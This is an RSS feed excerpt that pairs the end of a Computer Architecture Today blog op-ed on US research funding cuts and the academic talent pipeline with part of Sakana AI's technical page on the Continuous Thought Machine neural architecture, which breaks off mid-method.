<p><strong data-start="1531" data-end="1583"><strong data-start="1531" data-end="1583">Benchmarks That Became Standards. </strong></strong><a href="http://spec.org/">SPEC</a> and <a href="http://mlcommons.org/">MLPerf</a>, which define fairness and accountability in systems evaluation, were shaped by collaborations among academics, national labs, and industry. SPEC benefited from early academic input and support from labs like LLNL. MLPerf was developed through a broad partnership spanning Stanford, UC Berkeley, and Harvard, alongside national labs and leading industry partners. Federal funding helped support the graduate students and principal investigators who worked across these sectors.</p>
<p>These are just a few examples, but they’re not outliers. They are the natural result of sustained public investment in ideas, people, and infrastructure. When we fund basic research, we don’t just advance knowledge; instead, we lay the groundwork for industries, train the talent that leads them, and shape the technologies that define our future.</p>
<p><b>Industry’s Quiet Debt to Academic Research</b></p>
<p>Amidst the growing chaos, <strong>the silence from industry is deafening</strong>. The tech sector often presents its breakthroughs as the product of internal innovation, as if they emerged fully formed from corporate labs. But as we’ve seen, many of today’s most transformative advances were first conceived, developed, and refined in publicly funded university research, long before they were commercialized by companies that now profit from them.</p>
<p>Moreover, the engineers and researchers who lead research innovation and infrastructure development at places such as Google, Meta, NVIDIA, AMD, and Apple were trained in publicly funded universities. The architects of MapReduce, TensorFlow, CUDA, and countless other industry-defining systems started in academic labs backed by NSF and DARPA grants. They learned their craft in spaces free from quarterly earnings pressure.</p>
<p>Yet, the returns on that public investment have been wildly asymmetric. A few million in research gifts are scattered across universities. Some branded fellowships support a handful of Ph.D. students, while many more are needed to sustain the scale of these programs. Occasionally, nonprofit consortia offer additional support. All of this is valued, but it pales compared to the industry salaries, stock options, and profit margins built on this foundation.</p>
<p>Meanwhile, academia continues to carry the burden: training the next generation, maintaining open infrastructure, and stewarding community benchmarks and standards—all while industry captures the lion’s share of the financial reward. This isn’t just an imbalance; it’s an existential threat to the very pipeline that sustains the industry’s future.</p>
<p><span>At a moment when the research ecosystem that built today’s tech giants is under unprecedented strain, the absence of their collective voice speaks volumes. Industry must step up to support and defend the public pipeline. Otherwise, it risks starving the very source of its future:</span></p>
<ul>
<li>
<ul>
<li aria-level="1"><b>You don’t get applied research without basic research.</b></li>
<li aria-level="1"><b>You don’t get a talent pool without a talent pipeline. </b></li>
<li aria-level="1"><b>You don’t get scale without exploration.</b></li>
</ul>
</li>
</ul>
<p><span>Many of you, our deeply respected colleagues, collaborators, and friends in industry, understand this. However, at this moment, mere understanding isn’t enough. We need you to speak up, show up, and take action. What is one thing you’re willing to do? Say it, do it, and let it count. And make no mistake: the need for action is urgent.</span></p>
<h2><b>The Talent Pipeline Under Threat</b></h2>
<p>Nowhere is action more urgently needed than protecting the talent pipeline, which is the foundation of our success. The pipeline that brought so many of us into this field is no longer just at risk; it’s beginning to collapse. Every chip, compiler, and system we’ve built has a lineage that runs through undergraduates, graduate students, and postdocs.</p>
<p><span>The fallout is already here. Schools are </span><a href="https://www.wesa.fm/health-science-tech/2025-02-21/university-pittsburgh-phd-pause-research-funding-uncertainty"><span>pausing PhD admissions</span></a><span> and are unsure if they can support students. Some <a href="https://www.thedp.com/article/2025/02/penn-graduate-student-class-size-cut-trump-funding">offers are being rescinded</a>. The prestigious</span><a href="https://www.nature.com/articles/d41586-025-01098-9"><span> NSF Graduate Research Fellowship</span></a><span> saw its awards cut in half this year. Undergraduate</span><a href="https://beta.nsf.gov/funding/opportunities/research-experiences-undergraduates-reu"> <span>REU programs</span></a><span>, which are a critical entry point into research for many budding scientists since they support their first exposure to research, have dropped from ~200 to just over 50 funded sites. Postdocs are being <a href="https://www.reddit.com/r/labrats/comments/1jq5wna/just_found_out_my_postdoc_got_terminated/">let go and terminated</a>. One PI described the situation as “<em>being in a war—you’re just trying to survive.</em>”</span></p>
<p><span>Meanwhile, </span><a href="https://ww2.aip.org/fyi/funding-cuts-hit-stem-career-pipelines"><span>65 NSF CAREER grants were canceled</span></a><span>, a blow that will deeply affect early-career faculty. Computer architecture is particularly vulnerable. Research in this field depends on costly infrastructure—simulators, chip tape-outs, and FPGAs. Without stable funding, labs shrink or shutter. The students who might have built the next great system won’t be trained. <strong>Unlike cloud computing infrastructure, academic infrastructure doesn’t scale back up overnight. </strong></span>There’s no autoscaling for talent development or research continuity.</p>
<p>International talent, long a cornerstone of the U.S. research engine, is also at risk. As the academic pathway grows more unstable and funding dries up, many may hesitate to come—or to stay. A growing number of scientists are now considering leaving. <a href="https://sciencebusiness.net/sites/default/files/inline-files/Letter%20to%20Commissioner%20Zaharieva.pdf">Europe is actively positioning itself as a haven for embattled U.S. researchers</a>, with calls for a “solidarity and attractivity boom” to welcome brilliant minds facing “ill-motivated and brutal funding cuts.” The <a href="https://www.nature.com/articles/d41586-025-00992-6">result could be a devastating brain drain</a> that would impoverish American innovation and diminish science.</p>
<p><span>Perhaps the most concerning aspect of this is that it isn’t just a slow-moving crisis; it’s happening now. If we don’t act, the next generation of systems talent may never enter the field.</span></p>
<h2><b>What We Can Do Now: ACT</b></h2>
<p><span>We know the systems community takes pride in solving hard problems. This is one of them. If you care about the future of innovation, education, and research, here’s a to-do:</span></p>
<p><span><b>A</b></span><b>dvocate with </b><a href="https://bit.ly/HigherEdPledge"><b>The People’s Pledge for Higher Education</b></a><b>: </b>No matter where you are, if you benefited from American higher education, make your voice part of something larger. Help build visibility, solidarity, and public pressure. This collective signal will help show our policymakers that research, education, and innovation are values we’re willing to defend. It gives them the moral support they need to fight the battles. Sign the pledge.</p>
<p><span><b>C</b></span><b>all on industry to contribute:</b><span> Ask your colleagues and friends in industry to step up. Those who have benefited should now stand to uphold. If you’re in the industry, ask your company to acknowledge its public reliance on the academic research pipeline. Encourage leadership to issue a statement, provide bridge funding for canceled research, or directly support students and labs. Urge them to engage with policymakers. Industry has influence—help it use that power responsibly. Make that call.</span></p>
<p><span><b>T</b></span><b>alk beyond the echo chamber: </b>If you’re in the U.S., <a href="https://www.congress.gov/members/find-your-member">contact your senator</a>. But no matter where you are, this movement needs more than policy. It needs people. Reach out to someone outside your usual circles: a colleague in industry, a former student, or a friend in product development. If each of us brings just one new voice into the conversation, we multiply our impact. Let your voice be heard.</p>
<p><b>Here’s an example of putting these principles into action:</b><span> Not everything has to be grand. My wife and I hosted a backyard BBQ for people in Boston—just good home-cooked food and an open invitation to folks from industry, academia, and the broader community. Over 100 people showed up, including several members of our SIGARCH community, not for an agenda, but because they care about higher education for their kids and their neighbors’ kids. We simply made space for conversation, connection, and reflection on what’s happening to education. The discussions that started that day are still unfolding, leading to actions. Sometimes, the most meaningful action begins with shared meals (because we all love food), honest dialogue, and the courage to come together.</span></p>
<p><span>Pick one. Reach one person. Do it today. </span></p>
<h2><b>Conclusion</b></h2>
<p>I’ve been surprised by how many people, from industry leaders to scientific citizens, are afraid to speak up. They cite fears of professional or social consequences. I understand that fear. But silence, especially now, is a form of complicity. As that silence reveals a troubling reality: in a field built on boldness and innovation, we have become hesitant to defend the very system that enables our work. <strong>Do something—just don’t do nothing.</strong></p>
<p>We live in a time that demands courage, the courage to speak up when others stay silent, to rise when others remain seated, and to build bridges between academia and industry rather than watch the gap grow wider. That courage is not something we must summon alone. As a community, we can find it together. We are responsible for protecting the ecosystem that enabled our success and ensuring it thrives for the next generation. For those in senior positions, that means using your influence, whether leading a research lab, directing an engineering team, or shaping corporate strategy, to keep our field’s intellectual infrastructure strong and vibrant.</p>
<p>As <a href="https://www.nature.com/articles/d41586-025-00562-w">Nature editorialized in February 2025</a>, “<strong>an assault on science and scientists <em>anywhere</em> is an assault on science and scientists <em>everywhere</em>.</strong>” The <a href="https://royalsociety.org/news/2025/02/science-under-threat/">Royal Society similarly warned</a> that cutting science for ideological reasons threatens not only national progress but the global fabric of evidence-based innovation. Science is collaborative by nature; when it’s weakened in one part of the world, the consequences ripple outward.</p>
<p>The time has come to be stewards of science—to stand up for what we believe in and what’s essential, even when it’s hard. Not to sit back and watch the pipeline stall, or let the system that built us quietly break. Our collective future in computing depends not just on what we invent, but on our willingness to defend the conditions that make invention possible. Find your purpose to summon the courage. I’m doing this to protect the opportunities that shaped my path — for my beautiful daughters, and for your kids. A.C.T. now.</p>
<h2><strong>About the Author</strong></h2>
<p>Dr. Vijay Janapa Reddi is a Professor at Harvard University, Vice President and co-founder of MLCommons, and author of the open-source <a href="https://mlsysbook.ai/">Machine Learning Systems textbook</a> and the <a href="https://www.edx.org/professional-certificate/harvardx-tiny-machine-learning">TinyML edX course series</a>. His work bridges computer architecture, machine learning systems, and edge computing. He is passionate about helping others succeed, just as his mentors, public education, and the academic pipeline once helped him.</p>
<p><strong>[Read the <a href="https://bit.ly/Pipeline-Stalling">Whitepaper</a> and <a href="https://cacm.acm.org/opinion/big-tech-you-need-academia-speak-up/">CACM article</a>] [<a href="https://creators.spotify.com/pod/show/jveejay/episodes/The%20Pipeline%20Is%20Stalling:%20Why%20America%E2%80%99s%20Economic%20and%20Technological%20Future%20Depends%20on%20Its%20Universities-e329lpn">Listen to the Podcast</a>] [✍️ <a href="https://bit.ly/HigherEdPledge">Sign the Pledge</a>]</strong></p>
<p><strong>Disclaimer:</strong> <em>These posts are written by individual contributors to share their thoughts on the Computer Architecture Today blog for the benefit of the community. Any views or opinions represented in this blog are personal, belong solely to the blog author and do not represent those of ACM SIGARCH or its parent organization, ACM.</em></p>
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Continuous Thought Machines (276 pts)]]></title>
            <link>https://pub.sakana.ai/ctm/</link>
            <guid>43959071</guid>
            <pubDate>Mon, 12 May 2025 02:21:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pub.sakana.ai/ctm/">https://pub.sakana.ai/ctm/</a>, See on <a href="https://news.ycombinator.com/item?id=43959071">Hacker News</a></p>
<div id="readability-page-1" class="page"><p id="no_javasript_warning">
    <h3>This page requires Javascript. Please enable it to view the website.</h3>
  </p><div id="dtbody">


<dt-byline></dt-byline>

<p>
<figcaption>
  tl;dr
</figcaption>
<figcaption>
  Neurons in brains use timing and synchronization in the way that they compute. This property seems essential for the flexibility and adaptability of biological intelligence. Modern AI systems discard this fundamental property in favor of efficiency and simplicity. We found a way of bridging the gap between the existing powerful implementations and scalability of modern AI, and the biological plausibility paradigm where <b>neuron timing matters</b>. The results have been surprising and encouraging.
<br>
</figcaption>
</p>



<div id="maze-demo-container">
    <h2>Interactive demonstration</h2>
    <div id="maze-demo">
            <!-- <div id="maze-load-overlay" class="maze-load-overlay loading-overlay-inactive">
                <div class="overlay-text">Click/Touch to load maze demo</div>
            </div> -->
            <p>Initializing...</p>
            
            <canvas id="mazeCanvas" width="39" height="39"></canvas>
            
            <div id="controls">
                
                <div>
                    <div>
                        <p>
                            <label for="validOnlyCheckbox">Valid Path Only</label>
                        </p>
                        <p>
                            <label for="autoSolveCheckbox">Auto-solve</label>
                        </p>
                    </div>
                    <div>
                        <p>
                            <label for="showPathCheckbox">Show Path</label>
                        </p>
                        <p>
                            <label for="showOverlayCheckbox">Show Attention Overlay</label>
                        </p>
                    </div>
                </div>
                <p><label for="fpsSlider">Animation FPS:</label>
                    
                    <span id="fpsValueDisplay">60</span>
                </p>
            </div> 
            <p>
                Click to move Start/ End (toggle with 'move')
            </p>
            </div> 
        </div>
    
    



<h2>Introduction</h2>
<p>Neural networks (NNs) were originally inspired by biological brains, yet they remain significantly distinct from their biological counterparts. Brains demonstrate complex neural dynamics that evolve over time, but modern NNs intentionally abstract away such temporal dynamics in order to facilitate large-scale deep learning. For instance, the activation functions of standard NNs can be seen as an intentional abstraction of a neuron's firing rate, replacing the temporal dynamics of biological processes with a single, static value. Such simplifications, though enabling significant advancements in large-scale machine learning <dt-cite key="lecun2015deep,goodfellow2016deep,wei2022emergent"></dt-cite>, have resulted in a departure from the fundamental principles that govern biological neural computation.</p>
<p>Over hundreds of millions of years, evolution has endowed biological brains with rich neural dynamics, including spike-timing-dependent plasticity (STDP) <dt-cite key="caporale2008spike"></dt-cite> and neuronal oscillations. Emulating these mechanisms, particularly the temporal coding inherent in spike timing and synchrony, presents a significant challenge. Consequently, modern neural networks do not rely on temporal dynamics to perform compute, but rather prioritize simplicity and computational efficiency. This abstraction, while boosting performance on specific tasks, contributes to a recognized gap between the flexible, general nature of human cognition and current AI capabilities, suggesting fundamental components, potentially related to temporal processing, are missing from our current models <dt-cite key="lake2017building,marcus2018deep,chollet2019measure"></dt-cite>.</p>
<div>
  <h4>Why do this research?</h4>
  <p>Indeed, the notably high performance of modern AI across many fields suggests the emulation of neural dynamics is unwarranted. However, the gap between the highly flexible and general nature of human cognition and the current state of modern AI suggests missing components in our current models.</p>
</div>
<p>For these reasons, we argue that time should be a central component of artificial intelligence in order for it to eventually achieve levels of competency that rival or surpass human brains <dt-cite key="cariani2022time,maass2001relevance"></dt-cite>. Therefore, in this work, we address the strong limitation imposed by overlooking neural activity as a central aspect of intelligence. We introduce the <strong>Continuous Thought Machine (CTM)</strong>, a novel neural network architecture designed to explicitly incorporate neural timing as a foundational element. Our contributions are as follows:</p>
<ul>
<li>We introduce a <strong>decoupled internal dimension</strong>, a novel approach to modeling the temporal evolution of neural activity. We view this dimension as that over which thought can unfold in an artificial neural system, hence the choice of nomenclature.</li>
<li>We provide a mid-level abstraction for neurons, which we call <strong>neuron-level models</strong> (NLMs), where every neuron has its own internal weights that process a history of incoming signals (i.e., pre-activations) to activate (as opposed to a static ReLU, for example).</li>
<li>We use <strong>neural synchronization</strong> directly as the latent representation with which the CTM observes (e.g., through an attention query) and predicts (e.g., via a projection to logits). This biologically-inspired design choice puts forward neural activity as the crucial element for any manifestation of intelligence the CTM might demonstrate.</li>
</ul>
<h4>Reasoning models and recurrence</h4>
<p>The frontier of artificial intelligence faces a critical juncture: moving beyond simple input-output mappings towards genuine reasoning capabilities. While scaling existing models has yielded remarkable advancements, the associated computational cost and data demands are unsustainable and raise questions about the long-term viability of this approach. For sequential data, longstanding recurrent architectures <dt-cite key="hochreiter1997long,dey2017gate,medsker1999recurrent"></dt-cite> have largely been superseded by transformer-based approaches <dt-cite key="vaswani2017attention"></dt-cite>. Nevertheless, recurrence is re-emerging as a natural avenue for extending model complexity. Recurrence is promising because it enables iterative processing and the accumulation of information over time. Modern text generation models (sometimes referred to as 'reasoning models') use intermediate generations as a form of recurrence that enables additional compute during test-time. Recently, other works have demonstrated the benefits of the recurrent application of latent layers <dt-cite key="jaegle2021perceiver,geiping2025scaling,yang2023looped"></dt-cite>. While such methods bring us closer to the recurrent structure of biological brains, a fundamental gap nevertheless remains. <strong>We posit that recurrence, while essential, is merely one piece of the puzzle</strong>. The temporal dynamics unlocked by recurrence -- the precise timing and interplay of neural activity -- are equally crucial. The CTM differs from existing approaches in three ways: (1) the decoupled internal dimension enables sequential thought on any conceivable data modality; (2) private neuron-level models enables the consideration of precise neural timing; and (3) neural synchronization used directly as a representation for solving tasks.</p>
<hr>
<h2>Method</h2>


<p>
<figcaption>
<b>Fig 1.</b> The Continuous Thought Machine: <span>a single step in its internal recurrent process.</span>
</figcaption>
<figcaption>
The CTM unfolds neural activity internally as it thinks about data. At each step (one of which demonstrated above) a truncated history of 'pre activations' are collected and used for the <b>Neuron Level Models</b> (NLMs). The history of 'post activations' produced by all NLMs over time are kept and used to compute neuron-to-neuron synchronization over time. This result is a <b>Synchronization Representation</b>: a new, parameter-efficient, and <i>evidently powerful</i> representation that the CTM uses to observe (via attention) and predict.
<br>
</figcaption>
</p>
<p>The Continuous Thought Machine (CTM) is a neural network architecture that enables a novel approach to thinking about data. It departs from conventional feed-forward models by explicitly incorporating the concept of <strong>Neural Dynamics</strong> as the central component to its functionality. The video above gives a pictorial overview of the internal workings of the CTM. We give all technical details, including additional figures and verbose explanations in our <a href="https://arxiv.org/abs/2505.05522" target="_blank">Technical Report</a>. A <a href="https://github.com/SakanaAI/continuous-thought-machines" target="_blank">GitHub repository</a> is also available. We will provide links to relevant parts of the repository as we explain the model below.</p>
<div>
    <figure>
        <img src="https://pub.sakana.ai/ctm/assets/png/architecture.jpeg" alt="CTM architecture">
        <figcaption>
        <span><b>Fig 2.</b> CTM architecture</span>: The <span>1</span> synapse model (weights depicted as blue lines) models the cross-neuron interactions to produce pre-activations. For each neuron, a <span>2</span> history of pre-activations is kept, the most recent of which are used by the <span>3</span> neuron-level models (weights depicted as red lines) to produce <span>4</span> post-activations. A <span>5</span> history of post-activations is also kept and used to <span>6</span> compute a synchronization matrix. Neuron pairs are <span>7</span> selected from the synchronization matrix, yielding the <span>8</span> latent representations with which the CTM <span>9</span> produces outputs and modulates data through cross-attention. Modulated data (e.g., attention outputs) are <span>10</span> concatenated with post-activations for the next internal tick.
        </figcaption>
    </figure>
    <figure>
        <table>
            <thead>
                <tr>
                    <th scope="col">Variable</th>
                    <th scope="col">Description</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>$\mathbf{z}^t$</td> 
                    <td>Post-activations at internal tick $t$, after neuron-level models have been used.</td> 
                </tr>
                <tr>
                    <td>$\theta_{\text{syn}}$</td>
                    <td>Recurrent (synapse) model weights; U-NET-like architecture that connects neurons at a given internal tick, $t$.</td>
                </tr>
                <tr>
                    <td>$\mathbf{a}^t$</td>
                    <td>Pre-activations at internal tick $t$.</td>
                </tr>
                <tr>
                    <td>$\mathbf{A}^t$</td>
                    <td>History of <i>most recent</i> pre-activations, designed as a FIFO list so that they are always length $M$; inputs to neuron-level models.</td>
                </tr>
                <tr>
                    <td>$\theta_{\text{d}}$</td>
                    <td>Weights of a <i>single neuron-level model</i>, $d$ of $D$; MLP architecture, unique weights per neuron.</td>
                </tr>
                <tr>
                    <td>$\mathbf{Z}^t$</td>
                    <td>History of <i>all</i> post-activations up to this internal tick, variable length; used as input for synchronization dot products.</td>
                </tr>
                <tr>
                    <td>$\mathbf{S}^t$</td>
                    <td>Synchronization matrix at internal tick $t$. In practice we use far fewer neurons than $D$ for separate $\mathbf{S}^t_{\text{out}}$ and $\mathbf{S}^t_{\text{action}}$ synchronization representations.</td>
                </tr>
                <tr>
                    <td>$\mathbf{W}_{\text{out}}$, $\mathbf{W}_{\text{in}}$</td>
                    <td>Linear weight matrices that project from $\mathbf{S}^t_{\text{out}}$ and $\mathbf{S}^t_{\text{action}}$ to attention queries and predictions, respectively.</td>
                </tr>
                <tr>
                    <td>$\mathbf{o}^t$</td> 
                    <td>Cross attention output.</td> 
                </tr>
                </tbody>
        </table>
    </figure>
</div>
<p><strong>The CTM consists of three main ideas</strong>:</p>
<ol>
<li>The use of <a href="#internal-ticks">internal recurrence</a>, enabling a dimension over which a concept analogous to <strong>thought</strong> can occur. The entire process visualised in the video above is a single tick; the <a href="#maze-demo">interactive maze demo</a> at the top of the page uses 75 ticks. This recurrence is completely decoupled from any data dimensions.</li>
<li><a href="#neuron-level-models">Neuron-level models</a>, that compute post-activations by applying private (i.e., on a per-neuron basis) MLP models to a <em>history of incoming pre-activations</em>.</li>
<li><a href="#synchronization-representation">Synchronization as a representation</a>, where the neural activity over time is tracked and used to compute how pairs of neurons synchronize with one another over time. This measure of synchronization is the representation with which the CTM takes action and makes predictions. Listing 3 in the <a href="https://arxiv.org/abs/2505.05522" target="_blank">Technical Report</a> shows the logic for this, and Appendix K details how we use a recursive computation for efficiency.</li>
</ol>
<div>
  <h4>But what about data?</h4>
  <div>
    <p>While data is undoubtedly crucial for any modeling, the CTM is designed around the idea of internal recurrence and synchronization, where the role of data is somewhat secondary to the internal process itself.</p>
    <p><a href="#from-data">Input data is attended to</a> and ingested at each internal tick based on the current sychronisation, and similarly for predictions.</p>
  </div>
</div>
<video src="https://pub.sakana.ai/ctm/assets/mp4/topvideo.mp4" type="video/mp4" autoplay="" muted="" playsinline="" loop=""></video>
<p>
<figcaption><b>Fig 3.</b> Neural Dynamics when thinking about ImageNet: <span>Each subplot is the activity of a single neuron over time. It is the synchronization between these that forms the representation used by the CTM.</span>
</figcaption>
</p>
<h3 id="internal-ticks">Internal ticks: the 'thought' dimension</h3>
<p>We start by introducing the continuous internal dimension: <span><span><math><semantics><mrow><mi>t</mi><mo>∈</mo><mo>{</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>T</mi><mo>}</mo></mrow><annotation encoding="application/x-tex">t \in  \{ 1, \ldots ,T \}</annotation></semantics></math></span></span>. Unlike conventional sequential models -- such as RNNs or Transformers -- that process inputs step-by-step according to the sequence inherent in the data (e.g., words in a sentence or frames in a video), the CTM operates along a self-generated timeline of internal <strong>thought steps</strong>. This internal unfolding allows the model to iteratively build and refine its representations, even when processing static or non-sequential data such as images or mazes. To conform with existing nomenclature used in related works <dt-cite key="kirsch2021meta,pedersen2024structurally,kirsch2022introducing,schwarzschild2021can"></dt-cite>, we refer to these thought steps as 'internal ticks' from here on.</p>
<div>
  <h4>A dimension over which thought can unfold.</h4>
  <p>The CTM's internal dimension is that over which the dynamics of neural activity can unfold. We believe that such dynamics are likely a cornerstone of intelligent thought.</p>
</div>
<h3 id="synapses">Recurrent weights: synapses</h3>
<p>A recurrent multi-layer perceptron (MLP structured in a U-NET fashion <dt-cite key="ronneberger2015u"></dt-cite>) acts as a synapse model for the CTM. At any internal tick <span><span><math><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span></span>, the synapse model produces what we consider <strong>pre-activations</strong>:</p>
<p><span><span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">a</mi></mrow><mi>t</mi></msup><mo>=</mo><msub><mi>f</mi><mrow><msub><mi>θ</mi><mrow><mtext><mi mathvariant="normal">s</mi><mi mathvariant="normal">y</mi><mi mathvariant="normal">n</mi></mtext></mrow></msub></mrow></msub><mo>(</mo><mtext><mi mathvariant="normal">c</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">t</mi></mtext><mo>(</mo><msup><mrow><mi mathvariant="bold">z</mi></mrow><mi>t</mi></msup><mo separator="true">,</mo><msup><mrow><mi mathvariant="bold">o</mi></mrow><mi>t</mi></msup><mo>)</mo><mo>)</mo><mo>∈</mo><mtext>&nbsp;</mtext><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mi>D</mi></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">\bold{a}^t = f_{\theta_{\text{syn}}}(\text{concat}(\bold{z}^t, \bold{o}^t)) \in~\mathbb{R}^D,
</annotation></semantics></math></span></span></span></p>
<p>where <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">o</mi></mrow><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">\bold{o}^t</annotation></semantics></math></span></span> is <a href="#from-data">from input data</a>. The <span><span><math><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span> <strong>most recent pre-activations</strong> are then collected into a pre-activation 'history':</p>
<p><span><span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">A</mi></mrow><mi>t</mi></msup><mo>=</mo><mrow><mo fence="true">[</mo><mtable><mtr><mtd><mrow><msup><mrow><mi mathvariant="bold">a</mi></mrow><mrow><mi>t</mi><mo>−</mo><mi>M</mi><mo>+</mo><mn>1</mn></mrow></msup></mrow></mtd><mtd><mrow><msup><mrow><mi mathvariant="bold">a</mi></mrow><mrow><mi>t</mi><mo>−</mo><mi>M</mi><mo>+</mo><mn>2</mn></mrow></msup></mrow></mtd><mtd><mrow><mo>⋯</mo></mrow></mtd><mtd><mrow><msup><mrow><mi mathvariant="bold">a</mi></mrow><mi>t</mi></msup></mrow></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∈</mo><mtext>&nbsp;</mtext><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mrow><mi>D</mi><mo>×</mo><mi>M</mi></mrow></msup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\bold{A}^t = \begin{bmatrix}
\bold{a}^{t-M+1} &amp; \bold{a}^{t-M+2} &amp; \cdots &amp; \bold{a}^t
\end{bmatrix} \in~\mathbb{R}^{D \times M}.
</annotation></semantics></math></span></span></span></p>
<h3 id="neuron-level-models">Neuron-level models</h3>
<p><span><span><math><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span> effectively defines the length of the <strong>history of pre-activations</strong> that each neuron level model works with. Each neuron, <span><span><math><semantics><mrow><mo>{</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>D</mi><mo>}</mo></mrow><annotation encoding="application/x-tex">\{1, \ldots, D\}</annotation></semantics></math></span></span>, is then <strong>given its own privately parameterized MLP</strong> that produces what we consider <strong>post-activations</strong>:</p>
<p><span><span><span><math><semantics><mrow><msubsup><mrow><mi mathvariant="bold">z</mi></mrow><mi>d</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msubsup><mo>=</mo><msub><mi>g</mi><mrow><msub><mi>θ</mi><mi>d</mi></msub></mrow></msub><mo>(</mo><msubsup><mrow><mi mathvariant="bold">A</mi></mrow><mi>d</mi><mi>t</mi></msubsup><mo>)</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">\bold{z}_d^{t+1} = g_{\theta_d}(\bold{A}_d^t),
</annotation></semantics></math></span></span></span></p>
<p>where <span><span><math><semantics><mrow><msub><mi>θ</mi><mi>d</mi></msub></mrow><annotation encoding="application/x-tex">\theta_d</annotation></semantics></math></span></span> are the unique parameters for neuron <span><span><math><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span></span>, and <span><span><math><semantics><mrow><msubsup><mrow><mi mathvariant="bold">z</mi></mrow><mi>d</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msubsup></mrow><annotation encoding="application/x-tex">\bold{z}_d^{t+1}</annotation></semantics></math></span></span> is a single unit in the vector that contains all <strong>post-activations</strong>. <span><span><math><semantics><mrow><msubsup><mrow><mi mathvariant="bold">A</mi></mrow><mi>d</mi><mi>t</mi></msubsup></mrow><annotation encoding="application/x-tex">\bold{A}_d^t</annotation></semantics></math></span></span> is a <span><span><math><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span>-dimensional vector (time series). The full set of neuron post-activations are then concatenated with  <a href="#from-data">attention output</a> and fed recurrently into <span><span><math><semantics><mrow><msub><mi>f</mi><mrow><msub><mi>θ</mi><mrow><mtext><mi mathvariant="normal">s</mi><mi mathvariant="normal">y</mi><mi mathvariant="normal">n</mi></mtext></mrow></msub></mrow></msub></mrow><annotation encoding="application/x-tex">f_{\theta_{\text{syn}}}</annotation></semantics></math></span></span> to produce pre-activations for next step, <span><span><math><semantics><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">t+1</annotation></semantics></math></span></span>, in the unfolding thought process.</p>
<h3 id="synchronization-representation">Synchronization as a representation: modulating data</h3>
<p>How should the CTM interact with the outside world? Specifically, how should the CTM consume inputs and produce outputs? We introduced a timing dimension over which something akin to thought can unfold. We also want the CTM's relationship with data (its interaction, so to speak) to depend not on a <em>snapshot</em> of the state of neurons (at some <span><span><math><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span></span>), but rather on the <strong>ongoing temporal dynamics of neuron activities</strong>. By way of solution, we turn again to natural brains for inspiration and find the concept of neural synchronization <dt-cite key="uhlhaas2009neural"></dt-cite> both fitting and powerful. For synchronization we start by collecting the post-activations into a post-activation 'history':</p>
<p><span><span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">Z</mi></mrow><mi>t</mi></msup><mo>=</mo><mrow><mo fence="true">[</mo><mtable><mtr><mtd><mrow><msup><mrow><mi mathvariant="bold">z</mi></mrow><mrow><mn>1</mn></mrow></msup></mrow></mtd><mtd><mrow><msup><mrow><mi mathvariant="bold">z</mi></mrow><mrow><mn>2</mn></mrow></msup></mrow></mtd><mtd><mrow><mo>⋯</mo></mrow></mtd><mtd><mrow><msup><mrow><mi mathvariant="bold">z</mi></mrow><mi>t</mi></msup></mrow></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∈</mo><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mrow><mi>D</mi><mo>×</mo><mi>t</mi></mrow></msup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\bold{Z}^t = \begin{bmatrix}
\bold{z}^{1} &amp; \bold{z}^{2} &amp; \cdots &amp; \bold{z}^t
\end{bmatrix} \in \mathbb{R}^{D \times t}.
</annotation></semantics></math></span></span></span></p>
<p>The length of <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">Z</mi></mrow><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">\bold{Z}^t</annotation></semantics></math></span></span> is equal to the current internal tick, meaning that <strong>this dimension is not fixed</strong> and can be arbitrarily large. We define neural synchronization as the matrix yielded by the inner dot product between post-activation histories:</p>
<p><span><span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">S</mi></mrow><mi>t</mi></msup><mo>=</mo><msup><mrow><mi mathvariant="bold">Z</mi></mrow><mi>t</mi></msup><mo>⋅</mo><mo>(</mo><msup><mrow><mi mathvariant="bold">Z</mi></mrow><mi>t</mi></msup><msup><mo>)</mo><mo>⊺</mo></msup><mo>∈</mo><mtext>&nbsp;</mtext><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mrow><mi>D</mi><mo>×</mo><mi>D</mi></mrow></msup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\bold{S}^t = \bold{Z}^t \cdot (\bold{Z}^t)^\intercal \in~\mathbb{R}^{D\times D}.
</annotation></semantics></math></span></span></span></p>
